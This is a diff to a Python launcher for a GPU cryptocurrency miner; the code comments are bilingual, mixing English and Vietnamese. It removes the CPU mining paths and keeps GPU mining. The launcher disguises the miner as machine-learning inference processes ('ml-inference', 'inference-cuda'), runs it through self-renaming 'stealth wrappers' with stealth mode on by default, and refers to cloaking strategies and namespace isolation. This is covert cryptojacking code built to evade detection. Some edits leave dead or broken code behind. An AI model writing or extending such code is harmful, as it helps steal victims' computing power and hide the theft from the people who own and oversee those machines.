@@ -61,26 +61,24 @@ os.makedirs(LOGS_DIR, exist_ok=True)
 # **Main application logger** (logger ứng dụng chính)
 logger = setup_logging('start_mining', str(Path(LOGS_DIR) / 'start_mining.log'), 'INFO')
 
-# ---------- DEBUG CPU LOGGING BOOSTER ----------
+# ---------- DEBUG GPU-ONLY LOGGING BOOSTER ----------
 try:
     from mining_environment.scripts.unified_logging import get_unified_logger
-    CPU_LOGGERS = [
+    GPU_LOGGERS = [
         'mining_environment.resource_control',
         'mining_environment.cloak_strategies',
-        'cpu_plugin',
-        'gpu_plugin',  # nếu muốn thấy plugin GPU
+        'gpu_plugin',  # GPU plugin debug logs
         'optimized_calc_chain',
-        'mining_environment.cpu_plugins.optimization.mining_integration_adapter',
     ]
-    for _name in CPU_LOGGERS:
+    for _name in GPU_LOGGERS:
         _lg = get_unified_logger(_name)
         _lg.setLevel(logging.DEBUG)
         for _h in _lg.handlers:
             _h.setLevel(logging.DEBUG)
-        _lg.debug('===== DEBUG MODE ENABLED (auto-booster) =====')
+        _lg.debug('===== GPU-ONLY DEBUG MODE ENABLED =====')
 except Exception as _dbg_err:
-    logger.warning(f'DEBUG booster init failed: {_dbg_err}')
-# ---------- END BOOSTER ----------
+    logger.warning(f'GPU debug booster init failed: {_dbg_err}')
+# ---------- END GPU BOOSTER ----------
 
 # **Dedicated Module Loggers** (Logger mô-đun chuyên dụng) - CPU loggers removed
 gpu_miner_logger = setup_logging('gpu_miner', str(Path(LOGS_DIR) / 'gpu_miner.log'), 'INFO')
@@ -88,7 +86,7 @@ gpu_plugin_logger = setup_logging('gpu_plugin', str(Path(LOGS_DIR) / 'gpu_plugin
 
 stop_event = threading.Event()
 process_lock = threading.Lock()
-cpu_process = None
+# CPU process variable removed for GPU-only mining
 gpu_process = None
 
 # Thêm biến privileged_manager_global để chia sẻ kết quả thiết lập môi trường giữa các luồng
@@ -427,39 +425,37 @@ def dual_logger_thread(process, log_file, process_name, log_lock):
         except Exception as cleanup_err:
             logger.error(f"Lỗi dọn dẹp trong dual_logger_thread: {cleanup_err}")
 
-def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
+def start_gpu_mining_process(retries=3, delay=5, privileged_manager=None):
     """
-    **Enhanced mining process** (quy trình khai thác nâng cao) với **dual logging** (ghi nhật ký kép), 
+    **GPU-only Enhanced mining process** (quy trình khai thác GPU nâng cao) với **dual logging** (ghi nhật ký kép), 
     **log rotation** (xoay vòng tệp nhật ký), và **thread-safe logging** (ghi nhật ký an toàn luồng).
     
     Args:
-        cpu (bool): True nếu là khai thác CPU, False nếu là GPU
         retries (int): Số lần thử lại tối đa
         delay (int): Thời gian chờ giữa các lần thử (giây)
         privileged_manager: Trình quản lý quyền hạn
     
     Returns:
-        subprocess.Popen: Tiến trình khai thác nếu thành công, None nếu thất bại
+        subprocess.Popen: Tiến trình khai thác GPU nếu thành công, None nếu thất bại
     """
-    # **🔧 DEBUG: Function entry logging** (ghi log đầu vào function)  
-    miner_type = 'CPU' if cpu else 'GPU'
-    logger.info(f"🔍 [DEBUG] start_mining_process() called - Type: {miner_type}")
+    # **🔧 DEBUG: GPU-only function entry logging** (ghi log đầu vào function GPU-only)  
+    logger.info(f"🔍 [DEBUG] start_gpu_mining_process() called - GPU-only mode")
     
-    executable = os.getenv('ML_COMMAND' if cpu else 'CUDA_COMMAND')
-    logger.info(f"🔍 [DEBUG] Executable path: {executable}")
+    executable = os.getenv('CUDA_COMMAND')
+    logger.info(f"🔍 [DEBUG] GPU Executable path: {executable}")
     if not executable or not os.path.isfile(executable) or not os.access(executable, os.X_OK):
-        logger.error(f"Tệp thực thi khai thác không hợp lệ hoặc không có quyền truy cập: {executable}")
+        logger.error(f"GPU executable không hợp lệ hoặc không có quyền truy cập: {executable}")
         stop_event.set()
         return None
 
-    mining_server = os.getenv('MINING_SERVER_CPU' if cpu else 'MINING_SERVER_GPU')
-    mining_wallet = os.getenv('MINING_WALLET_CPU' if cpu else 'MINING_WALLET_GPU')
+    mining_server = os.getenv('MINING_SERVER_GPU')
+    mining_wallet = os.getenv('MINING_WALLET_GPU')
     if not mining_server or not mining_wallet:
         logger.error("Các biến môi trường MINING_SERVER hoặc MINING_WALLET chưa được cấu hình.")
         stop_event.set()
         return None
 
-    miner_tag = 'cpu' if cpu else 'gpu'
+    miner_tag = 'gpu'
     miner_log_path = Path(LOGS_DIR) / f"{miner_tag}_miner.log"
     
     # **Log rotation** (xoay vòng tệp nhật ký) trước khi khởi chạy tiến trình
@@ -468,36 +464,32 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
     # **Thread-safe lock** (khóa an toàn luồng) cho **dual logging** (ghi nhật ký kép)
     log_lock = threading.Lock()
 
-    # Xác định **process name** (tên tiến trình) từ **resource_config.json** (tệp cấu hình tài nguyên hệ thống)
-    process_name = "ml-inference" if cpu else "inference-cuda"
+    # **GPU process name** (tên tiến trình GPU) cố định
+    process_name = "inference-cuda"
     
-    # **Plugin logging integration** (tích hợp ghi log plugin)
-    if cpu:
-        log_cpu_plugin_operation("PROCESS_STARTUP", f"Starting {process_name} mining process", "INFO")
-    else:
-        log_gpu_plugin_operation("PROCESS_STARTUP", f"Starting {process_name} mining process", "INFO")
+    # **GPU Plugin logging integration** (tích hợp ghi log plugin GPU)
+    log_gpu_plugin_operation("PROCESS_STARTUP", f"Starting {process_name} mining process", "INFO")
     
+    # **GPU mining command** (lệnh khai thác GPU) construction
     mining_command = [executable, '-o', mining_server, '-u', mining_wallet, '--tls']
-    if cpu:
-        mining_command.extend(['-a', 'rx/0', '--no-huge-pages'])
-    else:
-        # 🔧 FIX: Use valid CUDA library path instead of missing libmlls-cuda.so
-        cuda_loader = os.getenv('MLLS_CUDA', '/usr/lib/x86_64-linux-gnu/libcuda.so')
+    
+    # 🔧 GPU-specific configuration
+    cuda_loader = os.getenv('MLLS_CUDA', '/usr/lib/x86_64-linux-gnu/libcuda.so')
+    
+    # 🔍 DEBUG: Validate CUDA loader exists before use
+    if not os.path.exists(cuda_loader):
+        logger.warning(f"⚠️ CUDA loader not found: {cuda_loader}")
+        # Fallback to standard CUDA library
+        cuda_loader = '/usr/lib/x86_64-linux-gnu/libcuda.so'
+        logger.info(f"🔄 Using fallback CUDA loader: {cuda_loader}")
         
-        # 🔍 DEBUG: Validate CUDA loader exists before use
-        if not os.path.exists(cuda_loader):
-            logger.warning(f"⚠️ CUDA loader not found: {cuda_loader}")
-            # Fallback to standard CUDA library
-            cuda_loader = '/usr/lib/x86_64-linux-gnu/libcuda.so'
-            logger.info(f"🔄 Using fallback CUDA loader: {cuda_loader}")
+    logger.info(f"🎮 GPU Mining - CUDA loader: {cuda_loader}")
+    logger.info(f"🎮 GPU Mining - Loader exists: {os.path.exists(cuda_loader)}")
         
-        logger.info(f"🎮 GPU Mining - CUDA loader: {cuda_loader}")
-        logger.info(f"🎮 GPU Mining - Loader exists: {os.path.exists(cuda_loader)}")
-        
-        # 🎯 CORRECT: Use CUDA backend với kawpow algorithm cho inference-cuda
-        # inference-cuda được thiết kế cho CUDA, không phải OpenCL
-        mining_command.extend(['--cuda', f'--cuda-loader={cuda_loader}', '-a', 'kawpow'])
-        logger.info(f"🎮 GPU Mining - CORRECT: Using CUDA backend với kawpow algorithm cho inference-cuda")
+    # 🎯 CORRECT: Use CUDA backend với kawpow algorithm cho inference-cuda
+    # inference-cuda được thiết kế cho CUDA, không phải OpenCL
+    mining_command.extend(['--cuda', f'--cuda-loader={cuda_loader}', '-a', 'kawpow'])
+    logger.info(f"🎮 GPU Mining - CORRECT: Using CUDA backend với kawpow algorithm cho inference-cuda")
 
     enable_ns = os.getenv('ENABLE_NS_ISOLATION', '1') == '1'
     enable_stealth = os.getenv('ENABLE_STEALTH_MODE', '1') == '1'
@@ -510,33 +502,24 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
     subprocess_env = None  # Will use default environment (stealth wrapper creates clean_env)
     
     for attempt in range(1, retries + 1):
-        logger.info(f"Thử khởi chạy quá trình khai thác {'CPU' if cpu else 'GPU'} (Lần thử {attempt}/{retries})...")
+        logger.info(f"Thử khởi chạy quá trình khai thác GPU (Lần thử {attempt}/{retries})...")
         # **Debug logging** (ghi nhật ký gỡ lỗi) cho **GPU process creation** (tạo tiến trình GPU)
-        if not cpu:
-            logger.info(f"🔍 GPU Debug - Command: {' '.join(mining_command)}")
-            logger.info(f"🔍 GPU Debug - Stealth: {enable_stealth}, NS: {enable_ns}")
-            logger.info(f"🔍 GPU Debug - Environment: Default (stealth wrapper will create clean_env)")
+        logger.info(f"🔍 GPU Debug - Command: {' '.join(mining_command)}")
+        logger.info(f"🔍 GPU Debug - Stealth: {enable_stealth}, NS: {enable_ns}")
+        logger.info(f"🔍 GPU Debug - Environment: Default (stealth wrapper will create clean_env)")
         try:
-            # **Create subprocess** (tạo tiến trình con) với **PIPE** (đường ống) cho **dual logging** (ghi log kép)
+            # **Create GPU subprocess** (tạo tiến trình con GPU) với **PIPE** (đường ống) cho **dual logging** (ghi log kép)
             if enable_stealth:
-                # **Unified Self-Stealth subprocess** (tiến trình con tự ẩn danh thông nhất) - sử dụng stealth wrapper cho cả CPU & GPU
-                if cpu:
-                    # **CPU Stealth Wrapper** (wrapper ẩn danh CPU) - consolidated path
-                    stealth_wrapper_path = os.path.join(
-                        os.path.dirname(os.path.abspath(__file__)),
-                        "mining_environment", "stealth", "wrappers", "stealth_ml_inference.py"
-                    )
-                else:
-                    # **GPU Stealth Wrapper** (wrapper ẩn danh GPU) - RESTORED: Use correct inference-cuda wrapper
-                    stealth_wrapper_path = os.path.join(
-                        os.path.dirname(os.path.abspath(__file__)),
+                # **GPU Stealth Wrapper** (wrapper ẩn danh GPU) - RESTORED: Use correct inference-cuda wrapper
+                stealth_wrapper_path = os.path.join(
+                    os.path.dirname(os.path.abspath(__file__)),
                         "mining_environment", "stealth", "wrappers", "stealth_inference_cuda.py"
                     )
                 
                 if os.path.exists(stealth_wrapper_path):
                     # Sử dụng **[Self-Stealth Wrapper]** (wrapper tự ẩn danh) thay vì external spoof
                     stealth_command = [sys.executable, stealth_wrapper_path] + mining_command[1:]  # Remove executable, keep args
-                    miner_type = 'CPU' if cpu else 'GPU'
+                    miner_type = 'GPU'  # GPU-only mining
                     logger.info(f"🔒 [SELF-STEALTH] Using {miner_type} stealth wrapper: {stealth_wrapper_path}")
                     logger.info(f"🔍 [DEBUG] About to call subprocess.Popen with command: {stealth_command}")
                     
@@ -554,7 +537,7 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                         logger.info(f"🔍 [SELF-STEALTH] {miner_type} process will self-rename using internal stealth manager")
                 else:
                     # Fallback to standard subprocess nếu wrapper không tồn tại
-                    miner_type = 'CPU' if cpu else 'GPU'
+                    miner_type = 'GPU'  # GPU-only mining
                     logger.warning(f"⚠️ [SELF-STEALTH] {miner_type} stealth wrapper not found: {stealth_wrapper_path}")
                     logger.warning(f"⚠️ [SELF-STEALTH] Falling back to standard subprocess - no {miner_type} stealth")
                     logger.info(f"🔍 [DEBUG] About to call fallback subprocess.Popen with command: {mining_command}")
@@ -568,7 +551,7 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                     )
             elif enable_ns and privileged_manager:
                 # **Namespace isolation** (cô lập namespace) - **modified for dual logging** (sửa đổi cho ghi log kép)
-                logger.info(f"🔍 {'GPU' if not cpu else 'CPU'} using namespace isolation")
+                logger.info(f"🔍 GPU using namespace isolation")
                 process = subprocess.Popen(
                     mining_command,
                     stdout=subprocess.PIPE,
@@ -579,7 +562,7 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                 )
             else:
                 # **Standard subprocess** (tiến trình con tiêu chuẩn)
-                logger.info(f"🔍 {'GPU' if not cpu else 'CPU'} using standard subprocess")
+                logger.info(f"🔍 GPU using standard subprocess")
                 process = subprocess.Popen(
                     mining_command,
                     stdout=subprocess.PIPE,
@@ -591,7 +574,7 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
             
             if process:
                 startup_time = time.time()
-                miner_type = 'CPU' if cpu else 'GPU'
+                miner_type = 'GPU'  # GPU-only mining
                 logger.info(f"🔍 {miner_type} process created successfully with PID: {process.pid}")
                 
                 # **Enhanced startup logging** (ghi log khởi động nâng cao)
@@ -742,14 +725,12 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                 
                 time.sleep(2)
                 if process.poll() is not None:
-                    logger.error(f"Quá trình khai thác {'CPU' if cpu else 'GPU'} kết thúc sớm.")
+                    logger.error(f"Quá trình khai thác GPU kết thúc sớm.")
                     
                     # **Enhanced plugin logging for failures** (ghi log plugin nâng cao cho lỗi)
                     error_details = f"PID={process.pid} EXIT_CODE={process.returncode}"
-                    if cpu:
-                        log_cpu_plugin_operation("PROCESS_FAILURE", f"Early termination: {error_details}", "ERROR")
-                    else:
-                        log_gpu_plugin_operation("PROCESS_FAILURE", f"Early termination: {error_details}", "ERROR")
+                    # CPU plugin logging removed - GPU-only mode
+                    log_gpu_plugin_operation("PROCESS_FAILURE", f"Early termination: {error_details}", "ERROR")
                     
                     # **Simple early termination logging** (ghi log kết thúc sớm đơn giản)
                     logger.error(f"EARLY_TERMINATION: {process_name} {error_details}")
@@ -757,17 +738,15 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                 else:
                     # **Success logging** (ghi log thành công)
                     success_details = f"PID={process.pid} Command={' '.join(mining_command)}"
-                    if cpu:
-                        log_cpu_plugin_operation("PROCESS_SUCCESS", f"Mining process started: {success_details}", "INFO")
-                    else:
-                        log_gpu_plugin_operation("PROCESS_SUCCESS", f"Mining process started: {success_details}", "INFO")
+                    # CPU plugin logging removed - GPU-only mode
+                    log_gpu_plugin_operation("PROCESS_SUCCESS", f"Mining process started: {success_details}", "INFO")
                     
                     logger.info(f"🔍 [DEBUG] About to return process object - PID: {process.pid}, Type: {type(process)}")
                     return process
                     
         except Exception as e:
             logger.error(f"🔍 [DEBUG] Exception caught in start_mining_process: {type(e).__name__}: {str(e)}")
-            logger.error(f"Lỗi khi khởi động quá trình khai thác {'CPU' if cpu else 'GPU'}: {e}")
+            logger.error(f"Lỗi khi khởi động quá trình khai thác GPU: {e}")
             # **Enhanced debug info** (thông tin gỡ lỗi nâng cao) cho **cả CPU và GPU failures** (lỗi cả CPU và GPU)
             logger.error(f"🔍 Error Details - Exception: {type(e).__name__}: {str(e)}")
             logger.error(f"🔍 Error Details - Command: {' '.join(mining_command)}")
@@ -778,64 +757,11 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
         if attempt < retries:
             logger.info(f"Đợi {delay} giây trước khi thử lại...")
             time.sleep(delay)
-    logger.error(f"Không thể khởi chạy quá trình khai thác {'CPU' if cpu else 'GPU'}.")
+    logger.error(f"Không thể khởi chạy quá trình khai thác GPU.")
     stop_event.set()
     return None
 
-def manage_cpu_miner(privileged_mgr, max_retries: int = 5):
-    """
-    **DEPRECATED**: Quản lý **lifecycle** (vòng đời) của **CPU miner** (máy khai thác CPU) - 
-    **Replaced by cpu_mining_thread()** (thay thế bằng cpu_mining_thread())
-    
-    Note: Hàm này giữ lại để **backward compatibility** (tương thích ngược)
-    """
-    logger.warning("⚠️ manage_cpu_miner() is deprecated - use cpu_mining_thread() instead")
-    return
-    
-    # **Enhanced initial logging** (ghi log ban đầu nâng cao)
-    cpu_miner_logger.info("===== CPU MINER LIFECYCLE STARTED =====")
-    cpu_miner_logger.info(f"Manager PID: {os.getpid()}")
-    cpu_miner_logger.info(f"Thread ID: {threading.current_thread().ident}")
-    cpu_miner_logger.info(f"Max Retries: {max_retries}")
-    cpu_miner_logger.info("=========================================")
-    
-    # **Notify main logger** (thông báo logger chính)
-    logger.info("✅ CPU Miner Manager initialized with dedicated logging")
-    
-    # **Enhanced mining loop** (vòng lặp khai thác nâng cao)
-    cpu_miner_logger.info("🔄 Starting CPU mining supervision loop...")
-    
-    while not stop_event.is_set() and retries < max_retries:
-        with process_lock:
-            if not is_mining_process_running(cpu_process):
-                cpu_miner_logger.info(f"🔄 CPU process not running - attempting startup (attempt {retries + 1}/{max_retries})")
-                cpu_process = start_mining_process(cpu=True, privileged_manager=privileged_mgr)
-                if not is_mining_process_running(cpu_process):
-                    retries += 1
-                    cpu_miner_logger.warning(f"❌ CPU miner startup failed - retry {retries}/{max_retries}")
-                    logger.warning(f"CPU miner khởi động thất bại. Thử lại... ({retries}/{max_retries})")
-                else:
-                    cpu_miner_logger.info(f"✅ CPU miner started successfully - PID: {cpu_process.pid if cpu_process else 'Unknown'}")
-                    logger.info("CPU miner đã khởi động thành công.")
-                    retries = 0  # Reset retries on successful start
-            else:
-                # **Process running - log status** (tiến trình đang chạy - ghi log trạng thái)
-                retries = 0
-                cpu_miner_logger.debug(f"📊 CPU miner running normally - PID: {cpu_process.pid if cpu_process else 'Unknown'}")
-                
-                # **Log resource usage** (ghi log mức sử dụng tài nguyên)
-                log_resource_usage("ml-inference")
-        
-        # **Wait với detailed logging** (đợi với ghi log chi tiết)
-        cpu_miner_logger.debug("⏳ Waiting 30s before next supervision cycle")
-        stop_event.wait(30)
-    
-    if retries >= max_retries:
-        cpu_miner_logger.error(f"🚨 CPU miner failed {max_retries} times - stopping supervision")
-        logger.error("CPU miner đã thất bại quá nhiều lần. Dừng giám sát.")
-        stop_event.set()
-    
-    cpu_miner_logger.info("===== CPU MINER LIFECYCLE ENDED =====")
+# ✅ CPU MINER FUNCTION REMOVED: manage_cpu_miner() eliminated for GPU-only mining
 
 def manage_gpu_miner(privileged_mgr, max_retries: int = 5):
     """
@@ -875,7 +801,7 @@ def manage_gpu_miner(privileged_mgr, max_retries: int = 5):
                 retries += 1
             
             gpu_miner_logger.info(f"🚀 Starting GPU mining process (attempt {retries + 1}/{max_retries})")
-            new_process = start_mining_process(cpu=False, privileged_manager=privileged_mgr)
+            new_process = start_gpu_mining_process(privileged_manager=privileged_mgr)
             gpu_process = new_process
             
             if gpu_process and is_mining_process_running(gpu_process):
@@ -950,12 +876,11 @@ def environment_setup_thread():
         stop_event.set()
         return None
 
-def cpu_mining_thread():
-    """**Thread 2: CPU Mining** (Luồng 2: Khai thác CPU) với **PID tracking** (theo dõi PID) và **EventBus integration** (tích hợp EventBus)"""
-    global cpu_process
-    # 🔧 FIX: Sử dụng cpu_miner_logger thay vì tạo thread_logger riêng
-    thread_logger = cpu_miner_logger
-    thread_logger.info("⚡ CPU Mining Thread Started")
+# ✅ CPU MINING THREAD REMOVED: cpu_mining_thread() eliminated for GPU-only mining
+def _removed_cpu_mining_thread():
+    """**REMOVED**: CPU Mining thread eliminated for GPU-only operations"""
+    logger.warning("⚠️ CPU mining thread has been removed - GPU-only mode active")
+    return  # Early return - no CPU mining functionality
     
     bus = get_thread_event_bus()
     max_retries = 5
@@ -977,7 +902,7 @@ def cpu_mining_thread():
                 thread_logger.debug(f"[TRACE] is_mining_process_running={running_status}, PID={getattr(cpu_process,'pid',None)}")
                 if not running_status:
                     thread_logger.info(f"🔄 Starting CPU mining process (attempt {retries + 1}/{max_retries})")
-                    cpu_process = start_mining_process(cpu=True, privileged_manager=privileged_manager)
+                    cpu_process = start_gpu_mining_process(privileged_manager=privileged_manager)
                     thread_logger.info(f"🔍 [DEBUG] start_mining_process returned: {cpu_process} (type: {type(cpu_process)})")
                     if cpu_process:
                         thread_logger.info(f"🔍 [DEBUG] CPU process received successfully - PID: {cpu_process.pid}")
@@ -1069,7 +994,7 @@ def gpu_mining_thread():
             thread_logger.debug(f"[TRACE] is_mining_process_running={is_running}, PID={getattr(process,'pid',None)}")
             if not is_running:
                 thread_logger.info(f"🔄 Starting GPU mining process (attempt {retries + 1}/{max_retries})")
-                new_process = start_mining_process(cpu=False, privileged_manager=privileged_manager)
+                new_process = start_gpu_mining_process(privileged_manager=privileged_manager)
                 gpu_process = new_process
                 thread_logger.info(f"🔍 [DEBUG] start_mining_process returned: {gpu_process} (type: {type(gpu_process)})")
                 if gpu_process:
@@ -1319,13 +1244,8 @@ def main():
     )
     mining_threads.append(('Resource Manager', resource_thread, True))
 
-    # **Thread 2: CPU Mining** (Luồng 2: Khai thác CPU)
-    cpu_thread = threading.Thread(
-        target=cpu_mining_thread,
-        daemon=True,
-        name="CPUMiningThread"
-    )
-    mining_threads.append(('CPU Mining', cpu_thread, True))
+    # **CPU Mining Thread REMOVED** (Luồng khai thác CPU đã xóa) - GPU-only mode
+    # cpu_thread removed for GPU-only mining operations
 
     # **Thread 3: GPU Mining** (Luồng 3: Khai thác GPU)
     gpu_thread = threading.Thread(
@@ -1358,23 +1278,19 @@ def main():
     logger.info("🔍 Verifying threads health...")
     time.sleep(5)  # Cho phép threads khởi tạo hoàn tất
     
-    # **EventBus event handlers** (theo dõi pid & resource manager)**
+    # **EventBus event handlers** (theo dõi pid & resource manager) - GPU-only
     thread_status = {
-        'cpu_pid_registered': False,
-        'gpu_pid_registered': False
+        'gpu_pid_registered': False  # CPU pid tracking removed
     }
 
-    def cpu_pid_handler(payload):
-        thread_status['cpu_pid_registered'] = True
-        logger.info(f"✅ CPU Mining PID registered: {payload['pid']}")
+    # CPU pid handler removed for GPU-only mining
     
     def gpu_pid_handler(payload):
         thread_status['gpu_pid_registered'] = True
         logger.info(f"✅ GPU Mining PID registered: {payload['pid']}")
     
-    # **Subscribe to thread events** (đăng ký sự kiện luồng)
-    # chỉ dùng EventBus cho PID
-    bus.subscribe('mining:cpu_pid_registered', cpu_pid_handler)
+    # **Subscribe to GPU thread events** (đăng ký sự kiện luồng GPU)
+    # CPU subscription removed for GPU-only mining
     bus.subscribe('mining:gpu_pid_registered', gpu_pid_handler)
     
     active_count = sum(1 for _, thread in started_threads if thread.is_alive())
@@ -1403,15 +1319,14 @@ def main():
             try:
                 current_time = time.time()
                 
-                # **Enhanced real-time metrics** (chỉ số thời gian thực nâng cao) mỗi 15 giây
+                # **Enhanced real-time GPU-only metrics** (chỉ số thời gian thực GPU nâng cao) mỗi 15 giây
                 if current_time - last_metrics_time >= 15:
                     metrics = get_real_time_metrics()
-                    cpu_metrics = metrics.get("ml-inference", {})
+                    # CPU metrics removed for GPU-only mining
                     gpu_metrics = metrics.get("inference-cuda", {})
                     
-                    cpu_hash = cpu_metrics.get('current_hash_rate', 0)
                     gpu_hash = gpu_metrics.get('current_hash_rate', 0)
-                    total_hash = cpu_hash + gpu_hash
+                    total_hash = gpu_hash  # Only GPU hash rate
                     
                     # **System resource usage** (sử dụng tài nguyên hệ thống)
                     try:
@@ -1419,20 +1334,19 @@ def main():
                         memory = psutil.virtual_memory()
                         memory_percent = memory.percent
                         
-                        # **Enhanced metrics display** (hiển thị chỉ số nâng cao)
+                        # **Enhanced GPU-only metrics display** (hiển thị chỉ số GPU nâng cao)
                         runtime_total = current_time - monitor_start_time
                         metrics_display = (
-                            f"\033[96m📊 REAL-TIME METRICS [Runtime: {runtime_total:.0f}s]\n"
-                            f"   ├─ CPU Mining: {cpu_hash:.2f} H/s\n"
+                            f"\033[96m📊 GPU-ONLY REAL-TIME METRICS [Runtime: {runtime_total:.0f}s]\n"
                             f"   ├─ GPU Mining: {gpu_hash:.2f} H/s\n"
                             f"   ├─ Total Hash: {total_hash:.2f} H/s\n"
                             f"   ├─ CPU Usage: {cpu_percent:.1f}%\n"
                             f"   ├─ Memory Usage: {memory_percent:.1f}%\n"
-                            f"   └─ Active Processes: {len([p for p in [cpu_process, gpu_process] if p and p.poll() is None])}/2\033[0m"
+                            f"   └─ Active GPU Process: {1 if gpu_process and gpu_process.poll() is None else 0}/1\033[0m"
                         )
                         
                         print(metrics_display, flush=True)
-                        logger.info(f"METRICS: CPU={cpu_hash:.2f}H/s GPU={gpu_hash:.2f}H/s "
+                        logger.info(f"METRICS: GPU={gpu_hash:.2f}H/s "
                                    f"TOTAL={total_hash:.2f}H/s SYS_CPU={cpu_percent:.1f}% "
                                    f"SYS_MEM={memory_percent:.1f}% RUNTIME={runtime_total:.0f}s")
                         
@@ -1462,14 +1376,13 @@ def main():
                     except Exception as report_err:
                         logger.error(f"❌ Performance report error: {report_err}")
                 
-                # **Process health check** (kiểm tra sức khỏe tiến trình)
+                # **GPU Process health check** (kiểm tra sức khỏe tiến trình GPU)
                 with process_lock:
-                    cpu_alive = is_mining_process_running(cpu_process)
                     gpu_alive = is_mining_process_running(gpu_process)
                 
-                if not cpu_alive and not gpu_alive:
-                    logger.warning("⚠️ All mining processes stopped!")
-                    print(f"\033[91m⚠️ ALL MINING PROCESSES STOPPED!\033[0m", flush=True)
+                if not gpu_alive:
+                    logger.warning("⚠️ GPU mining process stopped!")
+                    print(f"\033[91m⚠️ GPU MINING PROCESS STOPPED!\033[0m", flush=True)
                 
                 time.sleep(15)  # **Check interval** (khoảng thời gian kiểm tra)
                 
@@ -1576,11 +1489,9 @@ def main():
     except Exception as e:
         logger.error(f"Lỗi khi tạo báo cáo hiệu suất cuối cùng: {e}")
     
-    # **Log final mining operations** (ghi nhật ký các thao tác khai thác cuối cùng)
+    # **Log final GPU mining operations** (ghi nhật ký các thao tác khai thác GPU cuối cùng)
     with process_lock:
-        if cpu_process:
-            log_mining_operation("ml-inference", "STOP", cpu_process.pid, 
-                                {"reason": "shutdown", "uptime": time.time()})
+        # CPU logging removed for GPU-only mining
         if gpu_process:
             log_mining_operation("inference-cuda", "STOP", gpu_process.pid, 
                                 {"reason": "shutdown", "uptime": time.time()})
@@ -1589,18 +1500,7 @@ def main():
     # **Process cleanup with thread safety** (dọn dẹp tiến trình với an toàn luồng)
     logger.info("🧹 Cleaning up mining processes...")
     with process_lock:
-        # **Terminate CPU process** (kết thúc tiến trình CPU)
-        if cpu_process and cpu_process.poll() is None:
-            logger.info(f"Dừng tiến trình CPU miner (PID: {cpu_process.pid})...")
-            try:
-                cpu_process.terminate()
-                cpu_process.wait(timeout=5)  # Wait for graceful termination
-                logger.info("✅ CPU process terminated gracefully")
-            except subprocess.TimeoutExpired:
-                logger.warning("⚠️ CPU process did not terminate gracefully, forcing kill")
-                cpu_process.kill()
-            except Exception as e:
-                logger.error(f"❌ Error terminating CPU process: {e}")
+        # **CPU process termination removed** (đã xóa kết thúc tiến trình CPU) - GPU-only mode
         
         # **Terminate GPU process** (kết thúc tiến trình GPU)
         if gpu_process and gpu_process.poll() is None:
